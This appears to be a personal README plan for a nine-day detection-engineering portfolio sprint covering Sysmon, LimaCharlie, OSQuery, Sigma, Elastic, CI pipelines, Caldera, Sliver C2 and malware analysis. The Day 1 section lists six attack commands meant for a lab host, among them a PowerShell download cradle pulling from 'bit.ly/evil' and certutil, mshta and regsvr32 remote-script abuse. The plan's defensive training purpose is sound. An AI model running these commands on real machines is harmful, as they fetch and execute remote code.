# 9-Day Detection Engineering Sprint (v2) – My Personal Battle Plan

**Goal of the Sprint:** 
Deliver a complete Detection Engineering portfolio built from real telemetry, custom detections, and adversary simulation — the kind that lands junior/mid-level DE roles in 2025–2026.
Focus: Execution only. Zero refactoring. Zero perfectionism. Zero scope creep.

**Repo Root Structure Overview**

Telemetry → Detections → Adversary Simulation → Detection Stories → Malware → Flagship Case Study

## DAY 1 — Telemetry Foundation (Sysmon + LimaCharlie + OSQuery cross-mapping)
**Objective:** Become fluent in three completely different telemetry sources and be able to explain field differences in an interview.

**Installations / Prerequisites**
- Re-install SwiftOnSecurity Sysmon config (gaming-safe, max visibility)
- Install OSQuery (Fleet-managed or standalone – minimal overhead)
- LimaCharlie already running

Expected Output:
A complete multi-sensor telemetry package showing how Windows, Sysmon, LimaCharlie, and OSQuery record each of the 6 executed TTPs. Output must include EVTX logs, JSON exports, 
OSQuery table dumps, and a written field-mapping analysis that explains differences across all three sources. This demonstrates full visibility coverage and baseline understanding of host telemetry.

**Tasks**
1. Run these 6 classic TTPs (one at a time):
   - `powershell -ep bypass -nop -c "IEX((New-Object Net.WebClient).DownloadString('https://bit.ly/evil'))"`
   - `certutil -urlcache -split -f https://live.sysinternals.com/Files/Procmon.exe bad.exe`
   - `rundll32.exe url.dll,FileProtocolHandler https://live.sysinternals.com/Files/Procmon.exe`
   - `wmic process call create "calc.exe"`
   - `mshta javascript:a=alert('MSHTA');close()`
   - `regsvr32 /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/T1218.011.sct scrobj.dll`

2. Capture telemetry from:
   - Event Viewer (4688, 4104)
   - Sysmon Event IDs 1, 3, 7, 11, 13
   - LimaCharlie PROC_CREATE, DNS_REQUEST, FILE_WRITE, MODULE_LOAD
   - OSQuery `processes`, `registry`, `scheduled_tasks` tables

**Repo Updates**

telemetry/day1/
├── sysmon.evtx
├── sysmon.json (exported via Sysmon-View or EVTX dump)
├── limacharlie_timeline_export.json
├── osquery_processes.sql
├── winlog_4688.evtx
└── field_mapping.md          ← You manually write this (the gold)

**Must Fully Understand by End of Day**
- Why Sysmon Event ID 1 has more fields than Windows 4688
- How LimaCharlie normalizes fields vs raw Sysmon
- What OSQuery exposes that neither Sysmon nor LC does
- ParentProcessId vs ParentImage vs ProcessGuid differences
- Why hashes sometimes appear in LC but not Sysmon

## DAY 2 — Sigma Rule Writing From Raw Telemetry
**Objective:** Stop copy-pasting rules. Write two production-quality Sigma rules from scratch using only Day 1 telemetry.

Expected Output:
Four custom Sigma rules built entirely from Day 1 telemetry: two high-fidelity rules and two intentionally noisy baselines. Each rule must pass sigma validate and include 
written rationale, false-positive considerations, and clear field-mapping justification. This demonstrates the ability to engineer detections from raw data rather than from templates.

**Tasks**
1. Pick two behaviors from Day 1 telemetry:
   - PowerShell download cradle
   - Signed-binary abuse (rundll32 url.dll or regsvr32 .sct)
2. Write one high-fidelity rule and one intentionally noisy baseline rule for each
3. Validate every rule with `sigma validate rule.yml`

**Repo Updates**

detections/sigma/day2/
├── powershell_cradle_high_fidelity.yml
├── powershell_cradle_noisy.yml
├── rundll32_url_dll_abuse.yml
├── false_positives.md
└── rule_reasoning.md


**Must Fully Understand**
- Sigma selection vs condition syntax
- field mapping differences (Image vs process_path vs FILE_PATH)
- How to reduce false positives with parent process or hash filters
- Why some LC fields don’t exist in Sigma yet

## DAY 3 — Atomic Red Team + Multi-Event Correlation
**Objective:** Move from single-event to multi-event detection logic.

Expected Output:
A multi-event detection package consisting of Atomic Red Team execution evidence, full JSON telemetry exports, and a correlation-based detection story. Output must 
demonstrate chained reasoning across process creation, persistence artifacts, registry modifications, and task scheduling. The detection story must show how three or more 
events connect to form an adversary behavior sequence instead of isolated single events.

**Tasks**
Run these four Atomic tests (safe, signed binaries):
- T1547.001 – Registry Run Keys
- T1053.005 – Scheduled Task Creation
- T1036.005 – Masquerading (rename calc.exe)
- T1003.001 – LSASS access (safe mimikatz detection test)

Write one multi-event detection story linking at least three events.

**Repo Updates**

adversary-simulation/atomic-red-team/day3/
├── atomic_commands.txt
└── execution_screenshots/
telemetry/atomic-red-team/day3/
└── full_telemetry_export.json
detection-stories/day3/
├── persistence_chain.md
├── persistence_chain_sigma.yml
└── correlation_diagram.png

**Must Fully Understand**
- Why single-event rules are weak
- How to chain process creation → registry write → scheduled task
- Difference between correlation and stacking

## DAY 4 — Elastic Stack (The SIEM Layer)
**Objective:** Translate your Sigma rules into real SIEM queries.

Expected Output:
A fully functional Elastic Stack instance running via Docker, with Day 1–3 telemetry successfully ingested into Kibana. Output must include KQL, EQL, and Lucene equivalents 
of your Day 2 Sigma rules, along with screenshots demonstrating query execution and event hits. This proves you can operationalize detections inside a SIEM environment rather than just writing YAML rules.

**Tasks**
1. Spin up Elastic + Kibana via Docker Compose (I’ll give you the exact file)
2. Ingest Day 1–3 JSON telemetry
3. Write KQL, EQL, and Lucene versions of your Day 2 Sigma rules

**Repo Updates**

detections/elastic/day4/
├── powershell_cradle.kql
├── powershell_cradle.eql
├── rundll32_abuse.lucene
└── screenshots/

**Must Fully Understand**
- KQL vs Lucene vs EQL
- Event.sequence vs parent-child joins
- Why SIEMs are still the final detection layer

## DAY 5 — Detection-as-Code Pipeline (GitHub Actions)
**Objective:** Make every rule CI-validated.

Expected Output:
A working Detection-as-Code (DaC) pipeline in GitHub Actions that automatically validates Sigma rules on pull requests and converts them into Elastic-compatible queries on merge. 
The workflow must fail on malformed detection logic and pass on valid rules. Output must include architecture documentation explaining the pipeline. This proves CI-driven rule governance competency.

**Tasks**
1. Add sigma-cli to repo
2. Add GitHub Actions workflow that:
   - Validates every .yml on PR
   - Converts to Elastic on merge
   - Fails on broken rules

**Repo Updates**

.github/workflows/sigma-ci.yml
dac/architecture.md
dac/diagram.png

**Must Fully Understand**
- Why DaC is non-negotiable in 2025+
- How recruiters spot copy-paste Sigma repos instantly

## DAY 6 — Caldera Adversary Emulation
**Role:** Structured MITRE ATT&CK emulation for correlation testing

Expected Output:
A complete Caldera adversary-emulation package that includes agent execution, full operation logs, and a correlation-focused detection story. 
Output must show at least one end-to-end ATT&CK chain (Discovery → Execution → Persistence), the telemetry produced from each phase, and the custom detection logic derived from that telemetry. 
This demonstrates your ability to validate detections against structured adversary profiles.

**Tasks**
1. Install Caldera
2. Run “Discovery + Execution + Persistence” profile
3. Capture full chain
4. Write one detection story

**Repo Updates**

adversary-simulation/caldera/day6/
└── everything
detection-stories/caldera-day6.md

## DAY 7 — Sliver C2
**Role:** Modern post-exploitation C2 framework (2025 Cobalt Strike replacement)

Expected Output:
A Sliver C2 telemetry package demonstrating beacon registration, post-exploitation actions, and lateral movement (e.g., WMI execution or DLL sideload). 
Output must include at least two Sigma rules derived from Sliver activity and the associated LimaCharlie/Sysmon telemetry. 
This demonstrates competence in detecting modern C2 frameworks replacing Cobalt Strike in 2025+ environments.

**Tasks**
1. Spin up Sliver server + implant
2. Execute beacon → inject → sideload → WMI lateral
3. Write two Sigma rules

**Repo Updates**

adversary-simulation/sliver/day7/
detections/sigma/sliver/

## DAY 8 — Malware & Static Analysis Fundamentals
**Tasks**
CAPA + HybridAnalysis on 3 samples (Mimikatz, packed benign, random tool)

Expected Output:
Three malware-analysis artifacts generated using CAPA and HybridAnalysis: one benign packed binary, one credential-access tool (e.g., Mimikatz), 
and one miscellaneous suspicious file. Output must include CAPA capability summaries, HybridAnalysis results, and detection notes linking capabilities to detection strategies. 
This demonstrates foundational malware-analysis literacy required for writing behavioral detections.

**Repo Updates**

malware/day8/

## DAY 9 — Flagship Case Study

Expected Output:
A complete flagship detection-engineering case study combining adversary simulation, multi-sensor telemetry, custom Sigma rules, SIEM queries, correlation logic, 
FP/FN analysis, and a SOC-ready playbook. Output must also include a visual diagram of the attack chain and detection path. This becomes the cornerstone 
artifact of your portfolio and the piece you use in interviews.

**Acceptance Criteria**
- End-to-end attack chain
- Telemetry from Sysmon + LC + OSQuery + Elastic
- Custom Sigma + Elastic queries
- FP/FN analysis
- SOC playbook snippet
- Detection diagram

**Deliverable**

case_studies/flagship/
Final case study must be written as if presenting detection coverage to a CTO or SOC engineering lead.

---